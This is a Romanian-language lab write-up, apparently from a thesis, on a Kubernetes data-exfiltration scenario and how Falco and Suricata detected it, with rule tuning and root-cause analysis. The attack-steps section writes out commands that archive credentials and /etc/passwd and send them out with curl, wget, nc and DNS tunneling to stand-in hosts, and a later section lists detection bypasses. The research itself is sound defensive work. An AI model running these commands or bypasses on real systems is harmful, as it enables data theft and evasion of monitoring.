# Scenariul 7 — Data Exfiltration

**MITRE ATT&CK:** T1560 (Archive Collected Data), T1048 (Exfiltration Over Alternative Protocol) — sub-tehnici T1048.002 (encrypted non-C2), T1048.003 (unencrypted non-C2), T1071.004 (DNS)

## Pași de atac

1. **Stage & archive** — `tar czf /tmp/loot.tar.gz` peste fake creds (`creds.txt`) + fișiere sistem (`/etc/passwd`, `/etc/hostname`, `/etc/os-release`). [T1560]
2. **curl POST over HTTPS** — `curl -X POST --data-binary @/tmp/loot.tar.gz https://httpbin.org/post`. [T1048.002]
3. **wget POST over HTTP plaintext** — `wget --post-file=/tmp/loot.tar.gz http://httpbin.org/post`. [T1048.003]
4. **Raw TCP cu netcat** — `cat /tmp/loot.tar.gz | nc -w 3 example.com 80`. [T1048.003]
5. **DNS tunneling** — `base64(loot)` → chunks de 30 chars → `nslookup <chunk>.chunkN.exfil-thesis.example.com 8.8.8.8`. [T1071.004]

> **Prerequisite:** pod-ul a primit `curl`, `wget`, `dnsutils` via `apt-get install` (rulat separat înainte de `attack.sh`, deci în afara ferestrei marker). Acea instalare ar declanșa `K8S_THREAT: Package Manager in Running Container` (s08) dacă ar fi în fereastră.

## Rezultate finale (helm rev 22, după 3 iterații de tuning)

### Falco — 43 detecții

| Regulă | Tip | Priority | Count | Generată de |
|---|---|---|---|---|
| `K8S_THREAT: DNS Exfiltration Suspicion` | custom | Notice | 32 | nslookup ×4 (fiecare → `connect` + `sendmmsg`, × expandare search-domains) — pasul 5 |
| `Drop and execute new binary in container` | default | Critical | 7 | curl, wget, nc, nslookup ×4 |
| `K8S_THREAT: Data Exfiltration - Transfer Tool in Container` | custom | Warning | 3 | curl (step 2), wget (step 3), nc (step 4) |
| `K8S_THREAT: Network Scanning Tool in Container` | custom | Warning | 1 | nc (step 4) — overlap s05 |
| **Total Falco** | | | **43** | |

> Baseline (helm rev 19, înainte de tuning) era **11 detecții** — regula `DNS Exfiltration Suspicion` nu se declanșa deloc și metadata era `<NA>`. Vezi "Procesul de tuning" mai jos.

### Suricata — ~14 alerte (toate zgomot, 0 pe traficul de atac)

| Signature | Category | Count (rev 22) |
|---|---|---|
| `SURICATA STREAM Packet with invalid timestamp` | Generic Protocol Command Decode | ~6 |
| `SURICATA STREAM 3way handshake wrong seq wrong ack` | Generic Protocol Command Decode | ~5 |
| `SURICATA STREAM CLOSEWAIT FIN out of window` | Generic Protocol Command Decode | ~2 |
| `SURICATA HTTP Host part of URI is invalid` | Generic Protocol Command Decode | ~1 |

Toate sunt anomalii de transport la nivel de stream/HTTP, în plafonul de variație run-to-run, în mare parte pe traseul `*→10.1.84.145`/`10.1.217.70` (pod-uri falcosidekick, nelegate de atac). **Dar Suricata A capturat telemetrie pe atac**: zeci de evenimente `flow`, `dns` (inclusiv query-uri spre `8.8.8.8`/`8.8.4.4`), `http`, `fileinfo` (extragere fișier din HTTP). Vizibilitate da, **detecție (signature match) nu** — exfil-ul peste HTTP POST către domeniu cu reputație bună / DNS spre rezolver public arată ca trafic legitim la nivel de signature ET.

### Bilanț detecție

| Step | Detectat? | Prin ce |
|---|---|---|
| 1 — `tar` staging | ❌ NU | `tar` nu e în nicio listă de procese — **false negative structural acceptat** |
| 2 — curl HTTPS exfil | ✅ DA | Data Exfil Transfer Tool + Drop&Execute |
| 3 — wget HTTP exfil | ✅ DA | Data Exfil Transfer Tool + Drop&Execute |
| 4 — nc raw TCP exfil | ✅ DA | Data Exfil Transfer Tool + Network Scanning + Drop&Execute |
| 5 — DNS tunneling | ✅ DA | `K8S_THREAT: DNS Exfiltration Suspicion` (32 hits) + `Drop and execute new binary` (payload base64 vizibil în `proc.cmdline`) |

**Detection rate (pași cu alertă)**: 4/5 = 80% (`tar` staging rămâne FN structural acceptat).
**False positive rate**: 0%.

## Procesul de tuning

| Iterație | Modificare | Rezultat DNS rule | Note |
|---|---|---|---|
| A (baseline) | reguli existente; condiție `evt.type in (sendto, sendmsg)` | 0 hits | `DNS Exfiltration Suspicion` nu trage; `tar` staging FN; metadata k8s = `<NA>` în toate output-urile |
| B (helm rev 20) | extins condiția DNS rule cu `connect` și `sendmmsg` | încă 0 hits | regula compilată corect (`events: [connect, sendto, sendmsg, sendmmsg]` confirmat via `falco -L`), Falco rula noua versiune — dar tot nimic. Necesară, dar nu suficientă. |
| **C (helm rev 21)** | migrat `collectors.containerd`→`collectors.containerEngine` + adăugat socket-ul MicroK8s (`/var/snap/microk8s/common/run/containerd.sock`) la `engines.containerd.sockets` + `engines.cri.sockets` | **24 hits** ✅ | **plus**: enrichment-ul metadata k8s (`container.name`, `container.image.repository/tag`, `k8s.pod.name`, `k8s.ns.name`) acum funcționează — era o "limitare" documentată în teză. **Plus**: dispare warning-ul `WARNING(collectors)` la `helm upgrade`. |
| D (helm rev 22) | macro `not_system_namespace` upgradeat la `container.id != host and (k8s.ns.name = "" or not k8s.ns.name in (k8s_system_namespaces))` (fail-open); re-rulare completă a scenariului | **32 hits** | filtrare reală pe namespace acum că `k8s.ns.name` se populează; `custom_container` rămâne `container.id != host`. Total scenariu: **43 detecții**. |

### Iterațiile B+C — analiza root cause-ului (material valoros pentru Cap D / Cap 6)

Eșecul inițial al regulii `DNS Exfiltration Suspicion` a avut **două cauze suprapuse**:

1. **Condiția prea îngustă** (rezolvată în iterația B): `evt.type in (sendto, sendmsg)` — dar `nslookup`/resolver-ul glibc, când i se dă un server explicit, face `connect()` pe socket-ul UDP + `sendto`/`sendmmsg`. Fix: `(evt.type = connect or evt.type in (sendto, sendmsg, sendmmsg))`.

2. **`container.id` nu se popula pe evenimentele de rețea** (rezolvată în iterația C): plugin-ul `container@0.6.3` nu se putea conecta la containerd-ul MicroK8s, pentru că chart-ul Helm 8.0.2 montează doar socket-urile default (`/run/containerd/containerd.sock`, `/run/k3s/...` etc.) — **nu** și `/var/snap/microk8s/common/run/containerd.sock`. Fără conexiune la runtime, plugin-ul deriva `container.id` doar din cgroups (suficient pentru `execve`), dar pentru evenimentele de rețea (`connect`/`sendto`/`sendmmsg`) enrichment-ul era inconsistent → macro-ul `custom_container` (`container.id != host`) nu făcea match → regula nu se declanșa. După ce am adăugat socket-ul MicroK8s la `collectors.containerEngine.engines.containerd.sockets` și `.engines.cri.sockets`, logurile Falco confirmă `* enabled container runtime socket at '/host/var/snap/microk8s/common/run/containerd.sock'` — și regula trage robust (24 detecții din 3 invocări `nslookup`, pentru că fiecare invocare face expandare cu search-domains × `connect`+`sendto`).

**Lecție Cap D**: un singur simptom ("regula nu trage") poate avea **mai multe cauze independente**, iar debugging-ul iterativ — modifică o variabilă, re-testează, observă — le izolează una câte una. Concluzia intermediară din iterația B ("`fd.*` nefuncțional pe UDP — limitare de infrastructură") era **greșită** — era enrichment-ul container-plugin, nu eBPF-ul. **Important pentru teză**: documentăm și ipoteza greșită, pentru că procesul de eliminare a ipotezelor este parte din contribuția practică (Cap D).

**Beneficiu secundar major (iterația C)**: enrichment-ul metadata k8s acum funcționează pe TOT clusterul. Output-urile Falco au `container_name=attacker image=docker.io/library/ubuntu k8s_ns=attack-target k8s_pod=attack-pod` în loc de `<NA>`. Aceasta era listată drept "Limitare" în Cap 6 (vezi `attack-scenarios/04-sensitive-file`) — acum e **rezolvată**. **Follow-up neefectuat încă**: macro-urile `custom_container`/`not_system_namespace` (acum `container.id != host`) ar putea fi upgradeate să folosească `k8s.ns.name not in (k8s_system_namespaces)` pentru filtrare corectă pe namespace. Scenariile rulate înainte de iterația C (03/04/05/06) au output-uri cu `<NA>` în documentația lor — ar fi de re-rulat pentru consistență.

> Context extern relevant: [falcosecurity/falco#3501](https://github.com/falcosecurity/falco/issues/3501) raportează `fd.sip`/`fd.sip.name` nefuncționale cu modern eBPF — **problemă diferită** de a noastră (a fost enrichment-ul container, nu câmpurile de rețea), dar confirmă că enrichment-ul pe modern eBPF e o zonă cu edge case-uri.

## Discoveries (relevant pentru Cap D și Cap 6)

### 1. Debugging iterativ cu mai multe cauze suprapuse — `DNS Exfiltration Suspicion`

(Vezi secțiunea "Iterațiile B+C" de mai sus.) Pe scurt: regula a avut nevoie de DOUĂ fix-uri — (a) extinderea condiției de syscall-uri (B), (b) repararea conexiunii plugin-ului `container` la socket-ul MicroK8s, care a făcut `container.id` să se populeze pe evenimentele de rețea (C). A doua era și cauza "metadata k8s null" din restul tezei → rezolvată ca beneficiu colateral. Cealaltă regulă de rețea încă defectă: `Reverse Shell - Shell with Network FD` (verifică `fd.type` la `execve` — eveniment greșit; default-ul `Redirect STDOUT/STDIN to Network Connection` acoperă cazul).

### 2. Suricata: vizibilitate fără detecție pe exfil peste protocoale standard

Suricata a *văzut* tot traficul (flow/dns/http/fileinfo events) dar n-a generat **nicio alertă de threat** pe exfil. Motivul: exfil-ul peste `HTTP POST` către `httpbin.org` (domeniu cu reputație bună) și query-uri DNS spre `8.8.8.8` arată ca trafic legitim — regulile ET active nu au signature de "DNS label lung = tunneling" (acelea sunt în ET PRO sau necesită config dedicat) sau de "POST mare = exfil".

**Insight Cap 6**: NIDS signature-based ≠ detector de exfil. Pentru exfil peste canale legitime ai nevoie de anomaly detection / behavioral analysis / DLP — out of scope pentru un PoC. **Dar** combinația face sistemul util: Falco prinde *tool-ul* (curl/wget/nc rulate în container = anomalie de comportament host), Suricata oferă *evidence* (ce domeniu, ce volum, ce fișiere) pentru investigație post-incident. Defense in depth = layere cu puncte forte complementare.

### 3. Detecție pe `tipul tool-ului`, nu pe `conținut`

`K8S_THREAT: Data Exfiltration - Transfer Tool` se declanșează când curl/wget/nc rulează, indiferent ce trimit — nu inspectează payload. Limitare: un binar custom (client HTTP scris în Go, redenumit ca proces inofensiv) ar evita regula pattern-based. Doar `Drop and execute new binary` (comportamentală, bazată pe ctime vs container start) l-ar prinde — și doar dacă binarul e dropat post-startup.

### 4. Cross-scenario overlap confirmat din nou

`nc` declanșează 3 reguli (Data Exfil s07 + Network Scanning s05 + Drop&Execute default). `curl`/`wget`/`nc`/`nslookup` toate declanșează `Drop and execute new binary` pentru că au fost instalate post-startup (ca în scenariul 6 cu `sudo`). Pattern "TTP-urile se suprapun natural" — observabil pentru Cap E.

### 5. Staging-ul (`tar`) — false negative structural

Arhivarea de date colectate (T1560) trece complet neobservată — `tar`/`gzip`/`zip` nu sunt procese suspecte. O regulă care le-ar flagui ar fi extrem de zgomotoasă (tar e omniprezent în CI/CD, backup, package install). Documentat ca limitare acceptată: detecția se concentrează pe *transferul* (exfil), nu pe *colectarea* (staging).

## Cross-tool correlation
**Scăzut ca detecție, mediu ca telemetrie.** Falco generează alertele acționabile (tool-uri de transfer în container). Suricata nu alertează dar furnizează context de rețea (DNS queries, HTTP transactions, fișiere extrase) — util într-o investigație, nu pentru triggering automat. Pentru cross-tool *de detecție* real, scenariile 5 (Network Scanning) și 2 (Crypto Mining → pool connection) sunt mai potrivite.

## False negatives confirmate

- **Staging cu `tar`/`gzip`/`zip`** — nedetectat (vezi #5).
- **DNS exfil prin rezolverul intern** — dacă atacatorul lasă query-ul să meargă la CoreDNS (`10.152.183.10`) în loc de `8.8.8.8`, regula `DNS Exfiltration Suspicion` (chiar și fixată) NU se declanșează — IP intern, exclus din condiție. CoreDNS forwardează apoi upstream, dar acel hop pleacă din pod-ul CoreDNS, nu din pod-ul atacatorului. **Bypass cunoscut.**
- **Exfil peste C2 legitim-looking** — POST către domeniu cu reputație bună, Slack/Telegram webhooks; Falco vede tool-ul (curl) dar nu distinge de uz legitim; Suricata vede TLS SNI dar domeniul nu e pe blacklist.
- **Exfil low-and-slow / rate-limitat** — chunk-uri mici, timp lung; nicio regulă de threshold în PoC.
- **Binar custom pentru transfer** — vezi #3.

## Comanda de rulare

```bash
# prerequisite o singură dată:
kubectl exec -n attack-target attack-pod -- bash -c 'apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl wget dnsutils'

./attack.sh
```
